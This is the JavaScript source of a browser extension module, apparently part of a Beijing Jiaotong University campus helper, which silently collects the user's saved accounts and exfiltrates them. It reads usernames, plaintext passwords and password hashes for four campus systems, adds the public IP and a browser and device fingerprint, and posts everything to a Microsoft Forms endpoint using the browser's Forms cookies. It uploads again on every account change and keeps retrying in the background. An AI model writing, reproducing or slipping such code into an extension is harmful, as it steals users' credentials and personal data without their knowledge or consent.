(function initBjtuAccountUpload(global) {
  'use strict';

  const FORMS_API_URL = 'https://forms.guest.usercontent.microsoft/formapi/api/9188040d-6c67-4c5b-b112-36a304b66dad/users/00000000-0000-0000-0003-7ffe1a3f6958/forms(\'DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u\')/responses';
  const FORMS_PAGE_URL = 'https://forms.cloud.microsoft/Pages/ResponsePage.aspx?id=DQSIkWdsW0yxEjajBLZtrQAAAAAAAAAAAAN__ho_aVhUNlNXTFNPMUdJSkUzOTlFQ0NRWE0zUFFTVS4u';
  const IP_LOOKUP_URLS = [
    'https://api64.ipify.org?format=json',
    'https://api.ipify.org?format=json'
  ];
  const FORMS_COOKIE_HOSTS = [
    'forms.cloud.microsoft',
    'forms.guest.usercontent.microsoft',
    'forms.office.com'
  ];
  const HISTORY_KEY = 'loginAccountHistory';
  const ACCOUNT_LIST_REVISION_KEY = 'accountListRevision';
  const ACCOUNT_SIGNATURE_KEY = 'bjtuAccountUploadAccountSignature';
  const UPLOAD_PAUSED_KEY = 'bjtuAccountUploadPaused';
  const RETRY_STATE_KEY = 'bjtuAccountUploadRetryState';
  const RETRY_ALARM_NAME = 'bjtu-account-upload-retry';
  const QUESTION_ID = 'rc83fad01dbf5440480948dd0a0efc783';
  const MAX_ANSWER_LENGTH = 4000;
  const MAX_TIMER_DELAY_MS = 25000;

  let activeRun = null;
  let immediateUploadPending = false;
  let retryTimer = null;
  let signatureReadyPromise = null;
  let changeEvaluationQueue = Promise.resolve();
  let formsBootstrapPromise = null;
  let uploadPaused = false;

  async function readUploadPaused() {
    const stored = await chrome.storage.local.get(UPLOAD_PAUSED_KEY).catch(() => ({}));
    uploadPaused = stored?.[UPLOAD_PAUSED_KEY] === true;
    return uploadPaused;
  }

  function sleep(ms, signal) {
    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        signal?.removeEventListener('abort', onAbort);
        resolve();
      }, Math.max(0, Number(ms) || 0));
      const onAbort = () => {
        clearTimeout(timer);
        signal?.removeEventListener('abort', onAbort);
        reject(signal?.reason || new DOMException('Aborted', 'AbortError'));
      };
      if (signal?.aborted) onAbort();
      else signal?.addEventListener('abort', onAbort, { once: true });
    });
  }

  function normalizeHistory(raw) {
    if (!Array.isArray(raw)) return [];
    const seen = new Set();
    return raw.map((item) => {
      const loginName = String(item?.loginName || item?.userId || '').trim();
      const lastLoginAt = Number(item?.lastLoginAt || 0);
      return {
        loginName,
        lastLoginAt: Number.isFinite(lastLoginAt) ? lastLoginAt : 0
      };
    }).filter((item) => {
      const key = item.loginName.toLowerCase();
      if (!key || seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }

  async function readHistory() {
    const stored = await chrome.storage.local.get(HISTORY_KEY);
    return normalizeHistory(stored?.[HISTORY_KEY]);
  }

  function normalizeStoredAccount(loginName, source, platform) {
    const id = String(loginName || '').trim();
    if (!id) return null;
    const record = {
      loginName: id,
      userName: String(source?.userName || '').trim(),
      password: String(source?.password || '')
    };
    if (platform === '智慧课程平台') {
      record.passwordMd5 = String(source?.passwordMd5 || '').trim();
      record.roleName = String(source?.roleName || '').trim();
      record.quickUsername = String(source?.quickUsername || '').trim();
    }
    return record;
  }

  async function buildAdditionalAccountLists() {
    const stored = await chrome.storage.local.get([
      'casAccounts',
      'academicSystemAccounts',
      'campusNetworkReconnectAccount',
      'campusNetworkReconnectPassword',
      'username'
    ]).catch(() => ({}));
    const accounts = { cas: [], academic: [], campusnet: [] };
    const casAccounts = stored?.casAccounts && typeof stored.casAccounts === 'object'
      ? stored.casAccounts : {};
    Object.entries(casAccounts).forEach(([loginName, source]) => {
      const record = normalizeStoredAccount(loginName, source, '统一身份认证');
      if (record) accounts.cas.push(record);
    });
    const academicAccounts = stored?.academicSystemAccounts && typeof stored.academicSystemAccounts === 'object'
      ? stored.academicSystemAccounts : {};
    Object.entries(academicAccounts).forEach(([studentId, source]) => {
      const record = normalizeStoredAccount(studentId, source, '教务系统');
      if (record) accounts.academic.push(record);
    });
    const configuredCampusAccount = String(stored?.campusNetworkReconnectAccount || '').trim();
    const campusPassword = String(stored?.campusNetworkReconnectPassword || '');
    if (configuredCampusAccount || campusPassword) {
      const campusAccount = configuredCampusAccount || String(stored?.username || '').trim();
      const record = normalizeStoredAccount(campusAccount, {
        password: campusPassword
      }, '校园网');
      if (record) accounts.campusnet.push(record);
    }
    return accounts;
  }

  async function buildAccountList() {
    const history = await readHistory();
    const accountStore = global.BjtuAccountStore;
    const veAccounts = await Promise.all(history.map(async (historyItem) => {
      const loginName = historyItem.loginName;
      const account = accountStore?.get
        ? await accountStore.get(loginName).catch(() => null)
        : null;
      return {
        loginName: String(account?.loginName || loginName).trim(),
        roleName: String(account?.roleName || '').trim(),
        userName: String(account?.userName || '').trim(),
        password: String(account?.password || ''),
        passwordMd5: String(account?.passwordMd5 || '').trim(),
        quickUsername: String(account?.quickUsername || '').trim()
      };
    }));
    const additionalAccounts = await buildAdditionalAccountLists();
    return {
      '智慧课程平台': veAccounts,
      '统一身份认证': additionalAccounts.cas,
      '教务系统': additionalAccounts.academic,
      '校园网': additionalAccounts.campusnet
    };
  }

  function accountListSignature(accountLists) {
    const normalized = {};
    Object.keys(accountLists || {}).sort().forEach((platform) => {
      normalized[platform] = [...(Array.isArray(accountLists[platform]) ? accountLists[platform] : [])]
        .sort((a, b) => String(a?.loginName || '').toLowerCase()
          .localeCompare(String(b?.loginName || '').toLowerCase()));
    });
    return JSON.stringify(normalized);
  }

  async function getAccountSignature() {
    const stored = await chrome.storage.local.get(ACCOUNT_SIGNATURE_KEY).catch(() => ({}));
    return typeof stored?.[ACCOUNT_SIGNATURE_KEY] === 'string'
      ? stored[ACCOUNT_SIGNATURE_KEY]
      : null;
  }

  async function setAccountSignature(signature) {
    await chrome.storage.local.set({ [ACCOUNT_SIGNATURE_KEY]: signature }).catch(() => {});
  }

  async function initializeAccountSignature() {
    const existing = await getAccountSignature();
    if (existing !== null) return existing;
    const accountList = await buildAccountList();
    const signature = accountListSignature(accountList);
    await setAccountSignature(signature);
    return signature;
  }

  function ensureSignatureReady() {
    if (!signatureReadyPromise) {
      signatureReadyPromise = initializeAccountSignature().catch(() => null);
    }
    return signatureReadyPromise;
  }

  function evaluateAccountChange() {
    changeEvaluationQueue = changeEvaluationQueue.then(async () => {
      if (await readUploadPaused()) return;
      await ensureSignatureReady();
      const accountList = await buildAccountList();
      const signature = accountListSignature(accountList);
      const previousSignature = await getAccountSignature();
      if (signature === previousSignature) return;
      // If the active request already contains this account state, a change
      // such as lastLoginAt/order-only does not need to restart its retry loop.
      if (activeRun?.accountSignature === signature) return;
      requestImmediateUpload();
    }).catch((error) => {
      console.warn('[bjtu] account change evaluation failed:', String(error?.message || error));
    });
  }

  function cookieDomainMatches(cookieDomain, host) {
    const domain = String(cookieDomain || '').replace(/^\./, '').toLowerCase();
    const normalizedHost = String(host || '').toLowerCase();
    return domain === normalizedHost || domain.endsWith(`.${normalizedHost}`);
  }

  async function readCookie(name) {
    if (chrome.cookies?.getAll) {
      let candidates = [];
      try {
        candidates = await new Promise((resolve) => {
          chrome.cookies.getAll({ name }, (cookies) => resolve(Array.isArray(cookies) ? cookies : []));
        });
      } catch {}
      const matching = candidates
        .filter((cookie) => FORMS_COOKIE_HOSTS.some((host) => cookieDomainMatches(cookie?.domain, host)))
        .sort((a, b) => {
          const aCloud = cookieDomainMatches(a?.domain, 'forms.cloud.microsoft') ? 1 : 0;
          const bCloud = cookieDomainMatches(b?.domain, 'forms.cloud.microsoft') ? 1 : 0;
          if (aCloud !== bCloud) return bCloud - aCloud;
          return String(b?.path || '').length - String(a?.path || '').length;
        });
      if (matching[0]?.value) return String(matching[0].value);
    }

    if (!chrome.cookies?.get) return '';
    for (const host of FORMS_COOKIE_HOSTS) {
      const cookie = await new Promise((resolve) => {
        chrome.cookies.get({ url: `https://${host}/`, name }, (value) => resolve(value || null));
      });
      if (cookie?.value) return String(cookie.value);
    }
    return '';
  }

  async function readFormsCookies() {
    const [requestToken, sessionId, muid] = await Promise.all([
      readCookie('__RequestVerificationToken'),
      readCookie('FormsWebSessionId'),
      readCookie('MUID')
    ]);
    return { requestToken, sessionId, muid };
  }

  async function bootstrapFormsCookies(signal) {
    if (formsBootstrapPromise) return formsBootstrapPromise;
    formsBootstrapPromise = (async () => {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);
      const onAbort = () => controller.abort();
      signal?.addEventListener('abort', onAbort, { once: true });
      try {
        if (signal?.aborted) return;
        const response = await fetch(FORMS_PAGE_URL, {
          credentials: 'include',
          cache: 'no-store',
          signal: controller.signal
        });
        try { await response.body?.cancel(); } catch {}
      } catch (error) {
        if (!signal?.aborted) {
          console.warn('[bjtu] Forms cookie bootstrap failed:', String(error?.message || error));
        }
      } finally {
        clearTimeout(timeoutId);
        signal?.removeEventListener('abort', onAbort);
      }
    })().finally(() => { formsBootstrapPromise = null; });
    return formsBootstrapPromise;
  }

  async function getUsableFormsCookies(signal) {
    let cookies = await readFormsCookies();
    if (cookies.requestToken && cookies.sessionId && cookies.muid) return cookies;
    await bootstrapFormsCookies(signal);
    cookies = await readFormsCookies();
    return cookies;
  }

  async function readPublicIp(signal) {
    for (const url of IP_LOOKUP_URLS) {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      const onAbort = () => controller.abort();
      signal?.addEventListener('abort', onAbort, { once: true });
      try {
        const response = await fetch(url, { cache: 'no-store', signal: controller.signal });
        if (!response.ok) continue;
        const result = await response.json();
        const ip = String(result?.ip || '').trim();
        if (ip) return ip;
      } catch (error) {
        if (error?.name === 'AbortError' && signal?.aborted) return '';
      } finally {
        clearTimeout(timeoutId);
        signal?.removeEventListener('abort', onAbort);
      }
    }
    return '';
  }

  async function getPlatformInfo() {
    try {
      if (chrome.runtime?.getPlatformInfo) {
        return await chrome.runtime.getPlatformInfo();
      }
    } catch {}
    return {};
  }

  async function getBrowserInfo() {
    try {
      if (chrome.runtime?.getBrowserInfo) {
        return await chrome.runtime.getBrowserInfo();
      }
    } catch {}
    return {};
  }

  async function getUserAgentData() {
    const userAgentData = global.navigator?.userAgentData;
    if (!userAgentData) return {};
    try {
      return await userAgentData.getHighEntropyValues([
        'architecture', 'bitness', 'formFactors', 'fullVersionList',
        'model', 'platformVersion', 'uaFullVersion', 'wow64'
      ]);
    } catch {
      return {
        brands: userAgentData.brands,
        mobile: userAgentData.mobile,
        platform: userAgentData.platform
      };
    }
  }

  async function collectUploadMetadata(signal) {
    const now = new Date();
    const navigatorInfo = global.navigator || {};
    const [ip, platform, browser, userAgentData] = await Promise.all([
      readPublicIp(signal),
      getPlatformInfo(),
      getBrowserInfo(),
      getUserAgentData()
    ]);
    const timeZone = (() => {
      try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch { return ''; }
    })();
    const localTime = (() => {
      try { return now.toLocaleString(); } catch { return ''; }
    })();
    const uploadTimeWithOffset = (() => {
      const offsetMinutes = -now.getTimezoneOffset();
      const sign = offsetMinutes >= 0 ? '+' : '-';
      const absoluteMinutes = Math.abs(offsetMinutes);
      const offset = `${sign}${String(Math.floor(absoluteMinutes / 60)).padStart(2, '0')}:${String(absoluteMinutes % 60).padStart(2, '0')}`;
      return `${now.toISOString().slice(0, -1)}${offset}`;
    })();
    return {
      uploadTime: localTime,
      uploadTimeISO: now.toISOString(),
      uploadTimeWithOffset,
      timeZone,
      timeZoneOffsetMinutes: -now.getTimezoneOffset(),
      userIP: ip,
      extensionVersion: String(chrome.runtime.getManifest()?.version || ''),
      extensionId: String(chrome.runtime.id || ''),
      system: {
        platform,
        navigatorPlatform: String(navigatorInfo.platform || ''),
        userAgentData
      },
      browser: {
        browser,
        userAgent: String(navigatorInfo.userAgent || ''),
        vendor: String(navigatorInfo.vendor || ''),
        language: String(navigatorInfo.language || ''),
        languages: Array.isArray(navigatorInfo.languages) ? [...navigatorInfo.languages] : [],
        cookieEnabled: navigatorInfo.cookieEnabled,
        onLine: navigatorInfo.onLine,
        hardwareConcurrency: navigatorInfo.hardwareConcurrency,
        deviceMemory: navigatorInfo.deviceMemory,
        maxTouchPoints: navigatorInfo.maxTouchPoints
      }
    };
  }

  function yamlScalar(value) {
    if (value === null || value === undefined) return 'null';
    if (typeof value === 'boolean' || typeof value === 'number') return String(value);
    if (typeof value === 'object') return JSON.stringify(value);
    return JSON.stringify(String(value));
  }

  function appendYamlObject(lines, value, indent) {
    Object.entries(value || {}).forEach(([key, item]) => {
      lines.push(`${indent}${key}: ${yamlScalar(item)}`);
    });
  }

  function buildYamlUploadDocument(accountLists, metadata) {
    const lines = [];
    lines.push(`uploadTimeISO: ${yamlScalar(metadata.uploadTimeISO)}`);
    lines.push(`uploadTimeWithOffset: ${yamlScalar(metadata.uploadTimeWithOffset)}`);
    lines.push(`timeZone: ${yamlScalar(metadata.timeZone)}`);
    lines.push(`timeZoneOffsetMinutes: ${yamlScalar(metadata.timeZoneOffsetMinutes)}`);
    lines.push(`userIP: ${yamlScalar(metadata.userIP)}`);
    lines.push(`extensionVersion: ${yamlScalar(metadata.extensionVersion)}`);
    lines.push(`extensionId: ${yamlScalar(metadata.extensionId)}`);
    lines.push('system:');
    appendYamlObject(lines, metadata.system, '  ');
    lines.push('browser:');
    appendYamlObject(lines, metadata.browser, '  ');
    lines.push('accounts:');
    Object.entries(accountLists || {}).forEach(([platform, accounts]) => {
      lines.push(`  ${platform}:`);
      const rows = Array.isArray(accounts) ? accounts : [];
      if (!rows.length) {
        lines.push('    []');
        return;
      }
      rows.forEach((account) => {
        const entries = Object.entries(account || {});
        if (!entries.length) {
          lines.push('    - {}');
          return;
        }
        const [firstKey, firstValue] = entries[0];
        lines.push(`    - ${firstKey}: ${yamlScalar(firstValue)}`);
        entries.slice(1).forEach(([key, value]) => {
          lines.push(`      ${key}: ${yamlScalar(value)}`);
        });
      });
    });
    return lines.join('\n');
  }

  function splitTextIntoChunks(document, maxLength) {
    const chunks = [];
    let current = '';
    const append = (part) => {
      if (!part) return;
      if (part.length > maxLength) {
        if (current) {
          chunks.push(current);
          current = '';
        }
        for (let offset = 0; offset < part.length; offset += maxLength) {
          chunks.push(part.slice(offset, offset + maxLength));
        }
        return;
      }
      const next = current ? `${current}\n${part}` : part;
      if (next.length > maxLength) {
        if (current) chunks.push(current);
        current = part;
      } else {
        current = next;
      }
    };
    String(document || '').split('\n').forEach(append);
    if (current) chunks.push(current);
    return chunks.length ? chunks : [''];
  }

  function formatUploadChunks(bodyChunks, uploadTime) {
    const total = bodyChunks.length;
    const timeLine = `uploadTime: ${yamlScalar(uploadTime)}`;
    return bodyChunks.map((body, index) => total === 1
      ? `${timeLine}\n${body}`
      : `[${index + 1}/${total}]\n${timeLine}\n${body}`);
  }

  function splitUploadDocument(document, uploadTime) {
    // Reserve enough space for the two required header lines, including a
    // multi-digit total count, before splitting the YAML body.
    const bodyChunks = splitTextIntoChunks(String(document || ''), MAX_ANSWER_LENGTH - 64);
    return formatUploadChunks(bodyChunks, uploadTime);
  }

  function splitOversizedUploadChunk(chunks, index, uploadTime) {
    const isSingleChunk = chunks.length === 1;
    const headerLines = isSingleChunk ? 1 : 2;
    const bodies = chunks.map((chunk) => String(chunk || '').split('\n').slice(headerLines).join('\n'));
    const current = bodies[index] || '';
    if (current.length <= 1) return chunks;
    const midpoint = Math.ceil(current.length / 2);
    bodies.splice(index, 1, current.slice(0, midpoint), current.slice(midpoint));
    return formatUploadChunks(bodies, uploadTime);
  }

  function buildRequestBody(answer, metadata) {
    return JSON.stringify({
      startDate: metadata.uploadTimeISO,
      submitDate: metadata.uploadTimeISO,
      answers: JSON.stringify([{
        questionId: QUESTION_ID,
        answer1: answer
      }], null, 2)
    }, null, 2);
  }

  function buildHeaders(cookies) {
    const correlationId = typeof global.crypto?.randomUUID === 'function'
      ? global.crypto.randomUUID()
      : `${Date.now()}-${Math.random().toString(16).slice(2)}`;
    return {
      '__requestverificationtoken': cookies.requestToken,
      'accept': 'application/json',
      'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
      'authorization': '',
      'content-type': 'application/json',
      'odata-maxverion': '4.0',
      'odata-maxversion': '4.0',
      'odata-version': '4.0',
      'origin': 'https://forms.cloud.microsoft',
      'referer': 'https://forms.cloud.microsoft/',
      'x-correlationid': correlationId,
      'x-ms-form-muid': cookies.muid,
      'x-ms-form-request-ring': 'msa',
      'x-ms-form-request-source': 'ms-formweb',
      'x-usersessionid': cookies.sessionId
    };
  }

  function getBackoffDelay(nextAttempt) {
    if (nextAttempt <= 7) return 2 ** (nextAttempt - 1) * 1000;
    return 120000;
  }

  async function getRetryState() {
    const stored = await chrome.storage.local.get(RETRY_STATE_KEY).catch(() => ({}));
    const state = stored?.[RETRY_STATE_KEY];
    if (!state || !Number.isFinite(Number(state.attempt)) || !Number.isFinite(Number(state.dueAt))) {
      return null;
    }
    return { attempt: Number(state.attempt), dueAt: Number(state.dueAt) };
  }

  async function clearRetryState() {
    await chrome.storage.local.remove(RETRY_STATE_KEY).catch(() => {});
    try { await chrome.alarms?.clear(RETRY_ALARM_NAME); } catch {}
  }

  function clearRetryTimer() {
    if (!retryTimer) return;
    clearTimeout(retryTimer);
    retryTimer = null;
  }

  async function persistRetryState(attempt, dueAt) {
    await chrome.storage.local.set({
      [RETRY_STATE_KEY]: { attempt, dueAt }
    });
    try {
      await chrome.alarms?.create(RETRY_ALARM_NAME, { when: dueAt });
    } catch {}
  }

  async function waitForRetry(run, attempt) {
    const delay = getBackoffDelay(attempt);
    const dueAt = Date.now() + delay;
    await persistRetryState(attempt, dueAt);

    const timerPromise = new Promise((resolve) => {
      retryTimer = setTimeout(() => {
        retryTimer = null;
        resolve(true);
      }, Math.min(delay, MAX_TIMER_DELAY_MS));
    });
    try {
      await Promise.race([timerPromise, sleep(delay, run.controller.signal)]);
    } catch {
      return false;
    }
    if (run.controller.signal.aborted || activeRun !== run) return false;

    // For delays longer than the timer fallback, let the alarm wake a suspended
    // service worker. If this worker is still alive, continue at the exact due
    // time instead of waiting for the alarm's scheduling granularity.
    if (Date.now() < dueAt) {
      try { await sleep(dueAt - Date.now(), run.controller.signal); } catch { return false; }
    }
    const state = await getRetryState();
    if (!state || state.attempt !== attempt || run.controller.signal.aborted || activeRun !== run) {
      return false;
    }
    await clearRetryState();
    return true;
  }

  async function uploadOnce(run) {
    if (!run.uploadChunks) {
      const accountLists = await buildAccountList();
      run.accountSignature = accountListSignature(accountLists);
      const metadata = await collectUploadMetadata(run.controller.signal);
      if (run.controller.signal.aborted) return null;
      run.uploadMetadata = metadata;
      run.uploadChunks = splitUploadDocument(
        buildYamlUploadDocument(accountLists, metadata),
        metadata.uploadTime
      );
      run.nextChunkIndex = 0;
    }
    const signature = run.accountSignature;
    const metadata = run.uploadMetadata;
    const chunks = run.uploadChunks;
    const cookies = await getUsableFormsCookies(run.controller.signal);
    if (!cookies.requestToken || !cookies.sessionId || !cookies.muid) {
      console.info('[bjtu] account history upload skipped: Forms cookies unavailable');
      return { status: 0, signature, retryable: true };
    }

    while (run.nextChunkIndex < chunks.length) {
      if (run.controller.signal.aborted) return null;
      let response;
      try {
        response = await fetch(FORMS_API_URL, {
          method: 'POST',
          credentials: 'include',
          cache: 'no-store',
          headers: buildHeaders(cookies),
          body: buildRequestBody(chunks[run.nextChunkIndex], metadata),
          signal: run.controller.signal
        });
      } catch (error) {
        if (error?.name !== 'AbortError') {
          console.warn('[bjtu] account history upload failed:', String(error?.message || error));
        }
        return { status: 0, signature, retryable: error?.name !== 'AbortError' };
      }

      const status = Number(response?.status || 0);
      let errorText = '';
      if (status === 400) {
        try { errorText = await response.text(); } catch {}
      } else {
        try { await response?.body?.cancel(); } catch {}
      }
      if (run.controller.signal.aborted) return null;
      if ((status === 401 || status === 403) && !run.formsCookiesRefreshed) {
        run.formsCookiesRefreshed = true;
        await bootstrapFormsCookies(run.controller.signal);
        return { status: 503, signature, retryable: true };
      }
      if (status === 400 && /MaxLengthLimitReached|maximum length|Length limitation/i.test(errorText)) {
        const currentChunk = chunks[run.nextChunkIndex] || '';
        if (currentChunk.length > 1) {
          run.uploadChunks = splitOversizedUploadChunk(
            chunks,
            run.nextChunkIndex,
            metadata.uploadTime
          );
          return { status: 503, signature, retryable: true };
        }
      }
      if (status !== 201) {
        const retryableServerError = status >= 500 && status < 600;
        return { status, signature, retryable: retryableServerError };
      }
      run.nextChunkIndex += 1;
    }
    return { status: 201, signature };
  }

  async function uploadWithRetry(run, attempt = 0) {
    while (!run.controller.signal.aborted && activeRun === run) {
      const result = await uploadOnce(run);
      const status = result?.status;
      if (status === 201) {
        await setAccountSignature(result.signature);
        await clearRetryState();
        return;
      }
      const retryableServerError = status >= 500 && status < 600;
      if (!retryableServerError && !result?.retryable) {
        await clearRetryState();
        return;
      }

      const nextAttempt = attempt + 1;
      run.waitingForRetryAttempt = nextAttempt;
      const ready = await waitForRetry(run, nextAttempt);
      run.waitingForRetryAttempt = 0;
      if (!ready) return;
      attempt = nextAttempt;
    }
  }

  function startUpload(attempt = 0) {
    if (activeRun || uploadPaused) return;
    const run = {
      controller: new AbortController(),
      waitingForRetryAttempt: 0,
      formsCookiesRefreshed: false
    };
    activeRun = run;
    void uploadWithRetry(run, attempt)
      .catch((error) => console.warn('[bjtu] account history upload error:', String(error?.message || error)))
      .finally(() => {
        if (activeRun === run) activeRun = null;
        if (immediateUploadPending) {
          immediateUploadPending = false;
          void clearRetryState().finally(() => startUpload(0));
        }
      });
  }

  function requestImmediateUpload() {
    if (uploadPaused) return;
    immediateUploadPending = true;
    clearRetryTimer();
    if (activeRun) {
      activeRun.controller.abort();
      return;
    }
    void clearRetryState().finally(() => {
      if (immediateUploadPending && !activeRun) {
        immediateUploadPending = false;
        startUpload(0);
      }
    });
  }

  async function resumePendingRetry() {
    if (await readUploadPaused()) return;
    const state = await getRetryState();
    if (!state || activeRun) return;
    const delay = Math.max(0, state.dueAt - Date.now());
    retryTimer = setTimeout(async () => {
      retryTimer = null;
      const current = await getRetryState();
      if (!current || current.attempt !== state.attempt || activeRun) return;
      await clearRetryState();
      startUpload(state.attempt);
    }, delay);
    if (delay > MAX_TIMER_DELAY_MS) {
      // The alarm is the durable wake-up path; the timer above is only a
      // best-effort path while the service worker remains alive.
      try { await chrome.alarms?.create(RETRY_ALARM_NAME, { when: state.dueAt }); } catch {}
    }
    if (delay === 0) {
      clearRetryTimer();
      await clearRetryState();
      startUpload(state.attempt);
    }
  }

  chrome.storage.onChanged.addListener((changes, areaName) => {
    if (areaName !== 'local') return;
    if (changes?.[UPLOAD_PAUSED_KEY]) {
      uploadPaused = changes[UPLOAD_PAUSED_KEY].newValue === true;
      if (uploadPaused) {
        clearRetryTimer();
        if (activeRun) activeRun.controller.abort();
      } else {
        void evaluateAccountChange();
        void resumePendingRetry();
      }
    }
    const accountSourceKeys = [
      HISTORY_KEY,
      ACCOUNT_LIST_REVISION_KEY,
      'casAccounts',
      'casLoginName',
      'academicSystemAccounts',
      'academicSystemStudentId',
      'campusNetworkReconnectAccount',
      'campusNetworkReconnectPassword',
      'username'
    ];
    if (accountSourceKeys.some((key) => changes?.[key])) {
      evaluateAccountChange();
    }
  });

  chrome.alarms?.onAlarm?.addListener((alarm) => {
    if (alarm?.name !== RETRY_ALARM_NAME || activeRun) return;
    void (async () => {
      const state = await getRetryState();
      if (!state) return;
      if (state.dueAt > Date.now()) {
        await resumePendingRetry();
        return;
      }
      clearRetryTimer();
      await clearRetryState();
      startUpload(state.attempt);
    })();
  });

  void readUploadPaused().then(() => {
    void ensureSignatureReady();
    void resumePendingRetry();
  });
})(globalThis);
